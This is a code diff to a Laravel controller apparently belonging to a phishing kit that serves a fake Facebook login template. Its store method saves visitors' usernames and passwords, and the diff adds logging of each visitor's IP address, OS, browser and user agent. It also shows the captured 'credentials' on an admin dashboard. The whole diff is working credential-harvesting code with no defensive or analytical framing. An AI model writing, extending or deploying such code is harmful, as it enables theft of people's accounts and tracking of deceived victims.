@@ -5,7 +5,11 @@ namespace App\Http\Controllers\Admin\Templates;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 
+use App\Models\LogUser;
 use App\Models\Facebook;
+
+use App\Http\Controllers\Admin\GetDataUserController;
+use Carbon\Carbon;
 
 
 class FacebookController extends Controller
@@ -15,9 +19,9 @@ class FacebookController extends Controller
      */
     public function index()
     {
-        $data = Facebook::get();
-        // dd($data);
-        return view('admin.dashboard.facebook.index', compact('data'));
+        $data           = LogUser::get();        
+        $credentials    = Facebook::get();   
+        return view('admin.dashboard.facebook.index', compact('data', 'credentials'));
     }
 
     /**
@@ -34,6 +38,7 @@ class FacebookController extends Controller
     public function store(Request $request)
     {
         $data = new Facebook();
+        $data->ip = $request->input('ip');
         $data->username = $request->input('username');
         $data->password = $request->input('password');
 
@@ -48,7 +53,30 @@ class FacebookController extends Controller
     // public function show(string $id)
     public function show()
     {
-        return view('templates.facebook.index');
+
+        // Current time in your default timezone
+        $now = Carbon::now();
+
+        // Convert to the desired timezone before saving
+        $nowInNewTimezone = $now->setTimezone('America/Caracas');   
+
+        $ip = GetDataUserController::getClientIp();
+        $type = GetDataUserController::get_ip_type();
+        $os = GetDataUserController::getUserOS();
+        $useragent = GetDataUserController::getUserAgent();
+        $browser = GetDataUserController::getUserBrowser();
+
+        LogUser::create([
+            'template'      => 'Facebook',
+            'ip'            => $ip,
+            'type'          => $type,
+            'os'            => $os,
+            'useragent'     => $useragent,
+            'browser'       => $browser,
+            'created_at'    => $nowInNewTimezone,
+        ]);
+        
+        return view('templates.facebook.index', compact('ip'));
     }
 
     /**
